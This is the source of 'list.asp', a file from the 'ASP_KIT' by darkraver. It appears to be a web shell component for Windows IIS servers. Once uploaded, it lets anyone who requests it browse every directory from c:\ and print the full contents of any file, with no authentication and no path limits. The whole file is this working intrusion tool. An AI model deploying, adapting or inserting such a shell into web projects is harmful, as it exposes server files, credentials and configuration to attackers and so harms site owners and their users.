<!--

ASP_KIT

list.asp = Directory & File View

by: darkraver
modified: 16/12/2005

-->

<body>
<html>

<%

file=request("file")
tipo=request("type")

If file="" then
	file="c:\"
	tipo="1"
End If

%>


<FORM action="" method="GET">
<INPUT TYPE="text" NAME="file" value="<%=file%>">
<INPUT TYPE="hidden" NAME="type" value="<%=tipo%>">
<INPUT TYPE="submit" Value="Consultar">
</FORM>


<%

If tipo="1" then
    Response.Write("<h3>PATH: " & file & "</h3>")
	ListFolder(file)
End If

If tipo="2" then
    Response.Write("<h3>FILE: " & file & "</h3>")

    Set oStr = server.CreateObject("Scripting.FileSystemObject")
    Set oFich = oStr.OpenTextFile(file, 1)

	Response.Write("<pre>--<br>")

    Response.Write(oFich.ReadAll)

    Response.Write("<br>--</pre>")

End If
%>

<%

sub ListFolder(path)

	set fs = CreateObject("Scripting.FileSystemObject")
	set folder = fs.GetFolder(path)

	Response.Write("<br>( ) <a href=?type=1&file=" & server.URLencode(path) & "..\>" & ".." & "</a>" & vbCrLf)

	for each item in folder.SubFolders
		Response.Write("<br>( ) <a href=?type=1&file=" & server.URLencode(item.path) & "\>" & item.Name & "</a>" & vbCrLf)
	next

	for each item in folder.Files
		Response.Write("<li><a href=?type=2&file=" & server.URLencode(item.path) & ">" & item.Name & "</a> - " & item.Size & " bytes, " & "</li>" & vbCrLf)
	next

end sub

%>

</body>
</html>
